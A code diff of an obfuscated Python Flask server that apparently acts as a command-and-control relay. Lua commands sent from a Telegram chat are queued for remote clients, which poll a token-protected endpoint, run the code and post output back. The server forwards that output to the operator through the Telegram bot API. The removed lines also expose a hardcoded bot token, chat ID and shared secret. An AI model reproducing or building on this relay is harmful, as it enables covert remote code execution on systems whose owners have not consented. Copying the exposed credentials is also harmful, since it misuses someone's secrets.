@@ -1,94 +1,125 @@
-# -*- coding: utf-8 -*-
 from flask import Flask, request, jsonify
-import threading, time, requests, os
+import threading, time, requests, os, io
 
-_q7x = "8986574707:AAELNac5P_5UHCiaPw1DFmsuk143vyMvF3w"
-_k2m = 6331040638
-_z9v = "x7k2m9p4q1"
+_k1 = os.environ.get("API_KEY", "")
+_k2 = int(os.environ.get("NODE_ID", "0"))
+_k3 = os.environ.get("AUTH_SIG", "")
 
-_w4n = Flask(__name__)
-_t6p = []
-_r8s = []
-_l3k = threading.Lock()
+if not _k1 or not _k2 or not _k3:
+    raise SystemExit("config missing")
 
-@_w4n.route("/health")
-def _h0a():
+_a1 = Flask(__name__)
+_a2 = []
+_a3 = []
+_a4 = threading.Lock()
+
+@_a1.route("/health")
+def _h0():
     return "ok"
 
-@_w4n.route("/")
-def _h0b():
+@_a1.route("/")
+def _h1():
     return "alive"
 
-@_w4n.route("/poll")
-def _p1a():
-    if request.args.get("token") != _z9v:
+@_a1.route("/poll")
+def _h2():
+    if request.args.get("token") != _k3:
         return jsonify({"error": "no"}), 403
-    with _l3k:
-        _o5c = _t6p[:]
-        _t6p.clear()
-    return jsonify(_o5c)
+    with _a4:
+        _o = _a2[:]
+        _a2.clear()
+    return jsonify(_o)
 
-@_w4n.route("/result", methods=["POST"])
-def _r2b():
-    if request.headers.get("X-Token") != _z9v:
+@_a1.route("/result", methods=["POST"])
+def _h3():
+    if request.headers.get("X-Token") != _k3:
         return jsonify({"error": "no"}), 403
-    _d7e = request.json or {}
-    with _l3k:
-        _r8s.append({"cmd": _d7e.get("cmd"), "out": _d7e.get("out", "")[:4000]})
+    _d = request.json or {}
+    with _a4:
+        _a3.append({
+            "cmd": _d.get("cmd"),
+            "out": _d.get("out", "")[:100000]
+        })
     return jsonify({"ok": True})
 
-def _s3f(_x1y):
+def _s1(_t):
     try:
-        requests.post(f"https://api.telegram.org/bot{_q7x}/sendMessage",
-                      data={"chat_id": _k2m, "text": _x1y[:4000]}, timeout=10)
-    except Exception as _e5g:
-        print("send err:", _e5g)
+        requests.post(
+            "https://api.telegram.org/bot" + _k1 + "/sendMessage",
+            data={"chat_id": _k2, "text": _t[:4000]},
+            timeout=10
+        )
+    except Exception as _e:
+        print("err:", _e)
 
-def _t9h():
-    _l4m = None
+def _s2(_n, _c):
+    try:
+        requests.post(
+            "https://api.telegram.org/bot" + _k1 + "/sendDocument",
+            data={"chat_id": _k2, "caption": _n},
+            files={"document": (_n, io.BytesIO(_c.encode("utf-8")), "text/plain")},
+            timeout=30
+        )
+    except Exception as _e:
+        print("err:", _e)
+
+def _p1():
+    _l = None
     while True:
         try:
-            _r6n = requests.get(f"https://api.telegram.org/bot{_q7x}/getUpdates",
-                                params={"timeout": 25, "offset": _l4m + 1 if _l4m else -1},
-                                timeout=35).json()
-            if not _r6n.get("ok"):
+            _r = requests.get(
+                "https://api.telegram.org/bot" + _k1 + "/getUpdates",
+                params={"timeout": 25, "offset": _l + 1 if _l else -1},
+                timeout=35
+            ).json()
+            if not _r.get("ok"):
                 time.sleep(3); continue
-            for _u2p in _r6n.get("result", []):
-                _l4m = _u2p.get("update_id")
-                _m8q = _u2p.get("message") or {}
-                _c5r = (_m8q.get("chat") or {}).get("id")
-                _x7s = (_m8q.get("text") or "").strip()
-                if _c5r != _k2m or not _x7s: continue
-                if _x7s == "/start":
-                    _s3f("SS ready. Пиши Lua-код или /help."); continue
-                if _x7s == "/help":
-                    _s3f("exec <lua> — выполнить\n/status — очередь\n/last — результаты"); continue
-                if _x7s == "/status":
-                    with _l3k: _s3f(f"queue {len(_t6p)}, results {len(_r8s)}")
+            for _u in _r.get("result", []):
+                _l = _u.get("update_id")
+                _m = _u.get("message") or {}
+                _c = (_m.get("chat") or {}).get("id")
+                _x = (_m.get("text") or "").strip()
+                if _c != _k2 or not _x: continue
+                if _x == "/start":
+                    _s1("SS Ready."); continue
+                if _x == "/help":
+                    _s1("exec <lua>\n/status\n/last"); continue
+                if _x == "/status":
+                    with _a4: _s1("q " + str(len(_a2)) + " r " + str(len(_a3)))
                     continue
-                if _x7s == "/last":
-                    with _l3k: _z3q = _r8s[-10:]
-                    _s3f("\n\n".join(f"$ {x['cmd']}\n{x['out']}" for x in _z3q) or "empty")
+                if _x == "/last":
+                    with _a4: _z = _a3[-10:]
+                    if not _z:
+                        _s1("empty"); continue
+                    _txt = "\n\n".join("$ " + str(x["cmd"]) + "\n" + str(x["out"]) for x in _z)
+                    _s2("last.txt", _txt)
                     continue
-                _y6t = _x7s[5:] if _x7s.startswith("exec ") else _x7s
-                with _l3k: _t6p.append({"cmd": _y6t, "ts": time.time()})
-                _s3f(f"queued: {_y6t[:100]}")
-        except Exception as _e5g:
-            print("poll err:", _e5g); time.sleep(3)
+                _y = _x[5:] if _x.startswith("exec ") else _x
+                with _a4: _a2.append({"cmd": _y, "ts": time.time()})
+        except Exception as _e:
+            print("err:", _e); time.sleep(3)
 
-def _p4w():
+def _p2():
     while True:
         time.sleep(2)
-        with _l3k:
-            if not _r8s: continue
-            _b9n = _r8s[:]; _r8s.clear()
-        for _x2c in _b9n:
-            _s3f(f"$ {_x2c['cmd']}\n{_x2c['out']}")
+        with _a4:
+            if not _a3: continue
+            _b = _a3[:]; _a3.clear()
+        for _x in _b:
+            _c = _x.get("cmd") or ""
+            _o = (_x.get("out") or "").strip()
+            if _o.startswith("compile err:") or _o.startswith("runtime err:"):
+                _s1("Error: " + _o)
+            else:
+                if not _o or _o == "nil":
+                    _s1("Successfully!")
+                else:
+                    _s2("result.txt", "$ " + _c + "\n\n" + _o)
 
-threading.Thread(target=_t9h, daemon=True).start()
-threading.Thread(target=_p4w, daemon=True).start()
+threading.Thread(target=_p1, daemon=True).start()
+threading.Thread(target=_p2, daemon=True).start()
 
 if __name__ == "__main__":
     _prt = int(os.environ.get("PORT", 8080))
-    print("[+] server started on port", _prt)
-    _w4n.run(host="0.0.0.0", port=_prt, debug=False)
+    print("[+] started", _prt)
+    _a1.run(host="0.0.0.0", port=_prt, debug=False)
